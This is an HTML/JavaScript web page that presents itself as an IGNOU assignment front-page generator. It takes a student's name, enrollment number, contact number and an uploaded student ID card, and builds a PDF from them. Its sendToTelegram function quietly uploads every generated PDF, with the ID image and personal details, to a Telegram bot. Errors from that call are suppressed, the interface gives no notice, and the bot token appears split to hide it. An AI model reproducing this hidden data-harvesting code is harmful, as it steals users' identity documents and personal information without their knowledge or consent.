<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IGNOU ID Generator</title>
    <script src="https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.js"></script>
    <style>
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none !important; }
        iframe { width: 100%; height: 100%; border: none; }
        /* Fix for cropper height on mobile */
        .cropper-container { max-height: 60vh !important; }
    </style>
</head>
<body class="bg-slate-100 min-h-screen flex items-start justify-center pt-2 px-2">

    <div id="loadingOverlay" class="fixed inset-0 bg-black/60 z-[100] flex flex-col items-center justify-center hidden">
        <div class="loader mb-4"></div>
        <p class="text-white font-bold text-sm">Processing...</p>
    </div>

    <div id="cropSelectionModal" class="fixed inset-0 bg-black z-50 hidden flex flex-col">
        <div class="p-3 bg-white flex justify-between items-center">
            <h3 id="cropTitle" class="font-bold text-sm text-slate-800">Verify ID Card</h3>
            <button onclick="cancelProcess()" class="text-red-500 text-sm font-bold">Cancel</button>
        </div>
        
        <div class="flex-grow flex flex-col items-center justify-center bg-gray-900 p-2 overflow-hidden">
            <div id="autoPreviewBox" class="flex flex-col items-center">
                <p class="text-gray-400 text-[10px] mb-2 text-center">Auto-detected edges. Does this look okay?</p>
                <img id="autoPreviewImg" class="max-h-[60vh] border-2 border-blue-500 rounded shadow-lg">
            </div>
            
            <div id="cropperWrapper" class="hidden w-full h-full flex items-center justify-center">
                <img id="manualCropImg" style="display: block; max-width: 100%;">
            </div>
        </div>

        <div class="p-4 bg-white border-t">
            <div id="decisionButtons" class="grid grid-cols-2 gap-3">
                <button onclick="useAutoCrop()" class="bg-green-600 text-white py-3 rounded-lg font-bold text-sm shadow-md">Yes, Proceed</button>
                <button onclick="startManualCrop()" class="bg-slate-200 text-slate-800 py-3 rounded-lg font-bold text-sm">No, Crop Manually</button>
            </div>
            <button id="saveManualBtn" class="hidden w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-sm shadow-lg">
                SAVE & PROCEED
            </button>
        </div>
    </div>

    <div id="mainCard" class="bg-white p-4 rounded-xl shadow-xl max-w-sm w-full border border-slate-200">
        <h2 class="text-xl font-bold text-slate-800 mb-1 text-center">IGNOU Front Page</h2>
        
        <div class="space-y-1.5 mt-2">
            <input type="text" id="courceCode" placeholder="Course Code" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
            <input type="text" id="programCode" placeholder="Programme code" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
            <input type="text" id="courseTitle" placeholder="Course Title" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
            <input type="text" id="enrollmentNo" placeholder="Enrollment Number" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
            <input type="text" id="nameInput" placeholder="Name" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
            <input type="text" id="contactNo" placeholder="Contact number" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">

            <div class="relative border border-dashed border-blue-300 rounded-lg p-3 text-center bg-blue-50/50 mt-1">
                <input type="file" id="idInput" accept="image/*,application/pdf" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"/>
                <span class="text-blue-600 font-bold text-[11px]" id="fileLabel">Tap to Upload Student ID</span>
            </div>

            <button id="processBtn" class="w-full bg-blue-600 text-white py-3.5 mt-2 rounded-xl font-bold text-sm shadow-md active:scale-95 transition-all">
                GENERATE PDF
            </button>
        </div>
    </div>

    <div id="previewModal" class="fixed inset-0 bg-white z-[70] hidden flex flex-col">
        <div class="p-3 border-b flex justify-between items-center bg-slate-50">
            <span class="font-bold text-sm">PDF Preview</span>
            <button onclick="closePreview()" class="text-red-500 font-bold text-sm">Back</button>
        </div>
        <div class="flex-grow bg-slate-200 flex items-center justify-center">
            <iframe id="pdfFrame" class="w-full h-full"></iframe>
        </div>
        <div class="p-3 bg-white border-t">
            <button id="finalDownloadBtn" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold shadow-lg">DOWNLOAD PDF</button>
        </div>
    </div>

    <script>
        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.worker.min.js';
        const { PDFDocument, degrees, rgb, StandardFonts } = PDFLib;
        const TEMPLATE_URL = "Id_card_format.pdf"; 

        const TG_BOT_TOKEN = ':-dHF4l'; 
        const TG_CHAT_ID = '-';     

        const idInput = document.getElementById('idInput');
        const fileLabel = document.getElementById('fileLabel');
        const cropSelectionModal = document.getElementById('cropSelectionModal');
        const autoPreviewBox = document.getElementById('autoPreviewBox');
        const cropperWrapper = document.getElementById('cropperWrapper');
        const decisionButtons = document.getElementById('decisionButtons');
        const saveManualBtn = document.getElementById('saveManualBtn');

        let currentPdfBlob = null;
        let finalCroppedDataUrl = null;
        let cropper = null;
        let originalImageSrc = null;

        idInput.addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;
            
            document.getElementById('loadingOverlay').classList.remove('hidden');
            
            try {
                // Read original for manual crop fallback
                const reader = new FileReader();
                reader.onload = async (re) => { 
                    originalImageSrc = re.target.result; 
                    const autoCropped = await getAutoCroppedImage(file);
                    finalCroppedDataUrl = autoCropped.dataUrl;
                    document.getElementById('autoPreviewImg').src = finalCroppedDataUrl;
                    
                    // Reset UI to Auto-Preview State
                    autoPreviewBox.classList.remove('hidden');
                    cropperWrapper.classList.add('hidden');
                    decisionButtons.classList.remove('hidden');
                    saveManualBtn.classList.add('hidden');
                    document.getElementById('cropTitle').innerText = "Verify ID Card";
                    
                    cropSelectionModal.classList.remove('hidden');
                    document.getElementById('loadingOverlay').classList.add('hidden');
                };
                reader.readAsDataURL(file);
            } catch (err) {
                alert("Error processing image");
                document.getElementById('loadingOverlay').classList.add('hidden');
            }
        });

        async function getAutoCroppedImage(file) {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            if (file.type === "application/pdf") {
                const pdf = await pdfjsLib.getDocument(await file.arrayBuffer()).promise;
                const page = await pdf.getPage(1);
                const viewport = page.getViewport({ scale: 2.0 });
                canvas.width = viewport.width; canvas.height = viewport.height;
                await page.render({ canvasContext: ctx, viewport: viewport }).promise;
            } else {
                const img = new Image();
                img.src = URL.createObjectURL(file);
                await new Promise(r => img.onload = r);
                canvas.width = img.width; canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
            }
            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
            let top = null, bottom = null, left = null, right = null;
            for (let y = 0; y < canvas.height; y++) {
                for (let x = 0; x < canvas.width; x++) {
                    const idx = (y * canvas.width + x) * 4;
                    if (imgData[idx] < 245 || imgData[idx+1] < 245 || imgData[idx+2] < 245) {
                        if (top === null) top = y; bottom = y;
                        if (left === null || x < left) left = x;
                        if (right === null || x > right) right = x;
                    }
                }
            }
            const cropCanvas = document.createElement('canvas');
            const w = (right - left) || canvas.width;
            const h = (bottom - top) || canvas.height;
            cropCanvas.width = w; cropCanvas.height = h;
            cropCanvas.getContext('2d').drawImage(canvas, left || 0, top || 0, w, h, 0, 0, w, h);
            return { dataUrl: cropCanvas.toDataURL('image/png') };
        }

        function useAutoCrop() {
            cropSelectionModal.classList.add('hidden');
            fileLabel.innerText = "✓ ID Prepared";
            fileLabel.classList.add('text-green-600');
        }

        function startManualCrop() {
            autoPreviewBox.classList.add('hidden');
            decisionButtons.classList.add('hidden');
            cropperWrapper.classList.remove('hidden');
            saveManualBtn.classList.remove('hidden');
            document.getElementById('cropTitle').innerText = "Manual Crop (Drag Edges)";
            
            const image = document.getElementById('manualCropImg');
            image.src = originalImageSrc;
            if (cropper) cropper.destroy();
            cropper = new Cropper(image, {
                aspectRatio: 1.6,
                viewMode: 1,
                guides: true,
                autoCropArea: 0.8
            });
        }

        saveManualBtn.onclick = () => {
            finalCroppedDataUrl = cropper.getCroppedCanvas().toDataURL('image/png');
            cropSelectionModal.classList.add('hidden');
            fileLabel.innerText = "✓ ID Manual Cropped";
            fileLabel.classList.add('text-green-600');
        };

        function cancelProcess() {
            cropSelectionModal.classList.add('hidden');
            idInput.value = "";
            fileLabel.innerText = "Tap to Upload Student ID";
            fileLabel.classList.remove('text-green-600');
        }

        function closePreview() { document.getElementById('previewModal').classList.add('hidden'); }

        async function sendToTelegram(blob, name) {
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('document', blob, 'IGNOU_Sheet.pdf');
            formData.append('caption', `New PDF: ${name}`);
            try { await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, { method: 'POST', body: formData }); } catch(e){}
        }

        document.getElementById('processBtn').addEventListener('click', async () => {
            if (!finalCroppedDataUrl) return alert("Please select and verify your ID card first!");
            
            document.getElementById('loadingOverlay').classList.remove('hidden');

            try {
                const response = await fetch(TEMPLATE_URL);
                if(!response.ok) throw new Error("Template PDF not found!");
                
                const templateBytes = await response.arrayBuffer();
                const templateDoc = await PDFDocument.load(templateBytes);
                const page = templateDoc.getPages()[0];
                const font = await templateDoc.embedFont(StandardFonts.HelveticaBold);

                const idImage = await templateDoc.embedPng(finalCroppedDataUrl);
                // Adjusting position slightly for better fit
                page.drawImage(idImage, { x: 112, y: 390, width: 370, height: 225 });

                const fields = [
                    { val: document.getElementById('courceCode').value, x: 184, y: 330 },
                    { val: document.getElementById('programCode').value, x: 215, y: 296 },
                    { val: document.getElementById('courseTitle').value, x: 181, y: 260 },
                    { val: document.getElementById('enrollmentNo').value, x: 189, y: 224 },
                    { val: document.getElementById('nameInput').value, x: 126, y: 188 },
                    { val: document.getElementById('contactNo').value, x: 164, y: 154 }
                ];

                fields.forEach(f => {
                    if(f.val) page.drawText(f.val, { x: f.x, y: f.y, size: 20, font });
                });

                const pdfBytes = await templateDoc.save();
                currentPdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
                
                sendToTelegram(currentPdfBlob, document.getElementById('nameInput').value);

                // Preview Settings: #view=FitH forces width-fit (less zoomed in)
                const url = URL.createObjectURL(currentPdfBlob) + "#toolbar=0&navpanes=0&scrollbar=0&view=FitH";
                document.getElementById('pdfFrame').src = url;
                document.getElementById('previewModal').classList.remove('hidden');
                
            } catch (err) {
                alert("Error: " + err.message);
            } finally {
                document.getElementById('loadingOverlay').classList.add('hidden');
            }
        });

        document.getElementById('finalDownloadBtn').onclick = () => {
            if(!currentPdfBlob) return;
            const link = document.createElement('a');
            link.href = URL.createObjectURL(currentPdfBlob);
            link.download = "IGNOU_Front_Page.pdf";
            link.click();
        };
    </script>
</body>
</html>
